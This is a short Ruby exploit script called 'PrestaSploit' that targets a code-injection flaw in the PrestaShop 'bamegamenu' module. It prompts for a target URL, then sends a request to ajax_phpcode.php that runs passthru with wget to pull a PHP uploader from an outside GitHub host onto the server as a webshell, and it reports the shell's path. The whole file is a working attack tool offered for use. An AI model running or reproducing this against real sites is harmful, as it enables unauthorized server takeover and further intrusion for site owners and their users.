require 'open-uri'
require 'colorize'


#path vuln =modules/bamegamenu/ajax_phpcode.php?code
class Design

	def Asciitext
		kaka = open("http://artii.herokuapp.com/make?text=PrestaSploit").read

	end

	def Copyright
		puts "Dev by: Muham'RB".red
		puts "My github: https://github.com/EaqueSH".blue
		puts "My Channel: https://www.youtube.com/channel/UC9ZVJjngK1Dr-U_lrBJI7ew?view_as=subscriber".blue
		puts "My twitter: https://twitter.com/EaqueK".blue


	end




end



class Exploit

	attr_accessor :uri, :name_page

	def initialize(url, pagename)
		@uri = url
		@name_page = pagename


	end

	def Exploitation
		vulnpath = "modules/bamegamenu/ajax_phpcode.php?code"
		uploader_link = "https://raw.githubusercontent.com/jackpudlar/uploader/master/uploader.php"
		page = 
		path_shell = "modules/bamegamenu/#{name_page}"

		exploit = open("#{uri}/#{vulnpath}=print_r(passthru(\"wget #{uploader_link} -O #{name_page}|tac #{name_page}\"));")
		if exploit.status == ["200", "OK"]
			puts "Yess !!!".green
			puts "#{uri} exploit with success".green

			puts "Path uploader: #{uri}/#{path_shell}".blue

		else
			puts "OOPS !! #{uri} Is not vulnerable".red

		end


	end







end


design = Design.new

puts design.Asciitext.blue
design.Copyright

print("URL: ")
uri = gets.chomp

print("page name (webshell.php) ")
namepage = gets.chomp



exploit = Exploit.new(uri, namepage)

exploit.Exploitation